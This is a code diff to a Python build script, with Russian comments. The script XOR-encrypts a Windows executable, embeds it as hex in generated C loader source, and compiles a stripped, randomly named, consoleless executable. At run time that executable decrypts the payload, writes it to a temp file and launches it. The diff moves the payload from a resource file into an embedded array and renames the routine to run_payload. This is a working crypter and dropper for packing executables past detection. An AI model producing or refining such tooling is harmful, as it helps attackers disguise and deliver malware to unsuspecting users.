@@ -25,7 +25,7 @@ def build_single_exe_with_dll(exe_path):
     print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
     
     # Проверка, что это EXE
-    if exe_data[0] != 0x4D or exe_data[1] != 0x5A:
+    if len(exe_data) < 2 or exe_data[0] != 0x4D or exe_data[1] != 0x5A:
         print("ERROR: Not a valid EXE file (missing MZ header)!")
         return None
     print("EXE header OK (MZ)")
@@ -49,19 +49,12 @@ def build_single_exe_with_dll(exe_path):
         f.write(key)
     print(f"Key saved: {name2}.bin ({len(key)} bytes)")
     
-    print("Creating resource file...")
+    print("Creating executable with embedded resources...")
     
-    rc_content = f'''
-#include <windows.h>
-IDR_1 RCDATA "{name1}.bin"
-IDR_2 RCDATA "{name2}.bin"
-'''
-    
-    rc_file = os.path.join(output_dir, 'resource.rc')
-    with open(rc_file, 'w', encoding='utf-8') as f:
-        f.write(rc_content)
-    
-    print("Creating executable...")
+    # Прямое встраивание данных в C код (без resource.rc)
+    # Конвертируем данные в C-массив
+    data_hex = encrypted.hex()
+    key_hex = key.hex()
     
     loader_code = f'''
 #include <windows.h>
@@ -71,60 +64,40 @@ IDR_2 RCDATA "{name2}.bin"
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
 
-#define IDR_1 101
-#define IDR_2 102
+// Встроенные данные (без resource.rc)
+static const unsigned char enc_data[] = 
+    "{data_hex}";
+static const size_t enc_size = {len(encrypted)};
 
-void proc1(unsigned char* d, int l, unsigned char* k, int kl) {{
+static const unsigned char xor_key[] = 
+    "{key_hex}";
+static const size_t key_size = {len(key)};
+
+void xor_decrypt(unsigned char* d, int l, unsigned char* k, int kl) {{
     for(int i = 0; i < l; i++) {{
         d[i] ^= k[i % kl];
     }}
 }}
 
-void proc2() {{
-    HMODULE h = GetModuleHandleA(NULL);
-    
-    HRSRC r1 = FindResourceA(h, MAKEINTRESOURCE(IDR_1), "RCDATA");
-    if (!r1) {{
-        MessageBoxA(NULL, "Resource IDR_1 not found!", "Error", MB_OK);
-        return;
-    }}
-    
-    HGLOBAL g1 = LoadResource(h, r1);
-    if (!g1) {{
-        MessageBoxA(NULL, "Failed to load IDR_1!", "Error", MB_OK);
-        return;
-    }}
-    
-    DWORD s1 = SizeofResource(h, r1);
-    unsigned char* d1 = (unsigned char*)LockResource(g1);
-    
-    HRSRC r2 = FindResourceA(h, MAKEINTRESOURCE(IDR_2), "RCDATA");
-    if (!r2) {{
-        MessageBoxA(NULL, "Resource IDR_2 not found!", "Error", MB_OK);
-        return;
-    }}
-    
-    HGLOBAL g2 = LoadResource(h, r2);
-    if (!g2) {{
-        MessageBoxA(NULL, "Failed to load IDR_2!", "Error", MB_OK);
-        return;
-    }}
-    
-    DWORD s2 = SizeofResource(h, r2);
-    unsigned char* d2 = (unsigned char*)LockResource(g2);
-    
-    // Расшифровываем XOR
-    unsigned char* out = (unsigned char*)malloc(s1);
+void run_payload() {{
+    // Расшифровываем
+    unsigned char* out = (unsigned char*)malloc(enc_size);
     if (!out) {{
         MessageBoxA(NULL, "Memory allocation failed!", "Error", MB_OK);
         return;
     }}
-    memcpy(out, d1, s1);
-    proc1(out, s1, d2, s2);
+    
+    // Конвертируем hex в байты
+    for(size_t i = 0; i < enc_size; i++) {{
+        char hex[3] = {{enc_data[i*2], enc_data[i*2+1], 0}};
+        out[i] = (unsigned char)strtol(hex, NULL, 16);
+    }}
+    
+    xor_decrypt(out, enc_size, (unsigned char*)xor_key, key_size);
     
     // Проверка, что это EXE
     if (out[0] != 0x4D || out[1] != 0x5A) {{
-        MessageBoxA(NULL, "Decrypted data is NOT a valid EXE (missing MZ header)!", "Error", MB_OK);
+        MessageBoxA(NULL, "Decrypted data is NOT a valid EXE!", "Error", MB_OK);
         free(out);
         return;
     }}
@@ -149,7 +122,7 @@ void proc2() {{
     }}
     
     DWORD w;
-    if (!WriteFile(f, out, s1, &w, NULL) || w != s1) {{
+    if (!WriteFile(f, out, enc_size, &w, NULL) || w != enc_size) {{
         MessageBoxA(NULL, "Failed to write temp file!", "Error", MB_OK);
         CloseHandle(f);
         DeleteFileA(tmp);
@@ -179,7 +152,7 @@ void proc2() {{
 }}
 
 int main() {{
-    proc2();
+    run_payload();
     Sleep(15000);
     return 0;
 }}
@@ -193,17 +166,9 @@ int main() {{
     exe_name = f"{generate_random_name()}.exe"
     loader_exe = os.path.join(output_dir, exe_name)
     
-    res_obj = os.path.join(output_dir, 'resource.o')
-    result = subprocess.run(['windres', '-i', rc_file, '-o', res_obj], capture_output=True)
-    if result.returncode != 0:
-        print(f"Resource compilation failed: {result.stderr.decode()}")
-        return None
-    print("Resource compiled OK")
-    
     cmd = [
         'gcc',
         loader_src,
-        res_obj,
         '-o', loader_exe,
         '-O3',
         '-s',
@@ -236,11 +201,9 @@ int main() {{
     
     # Cleanup
     try:
-        os.remove(rc_file)
-        os.remove(res_obj)
+        os.remove(loader_src)
         os.remove(data_bin)
         os.remove(key_bin)
-        os.remove(loader_src)
     except:
         pass
     
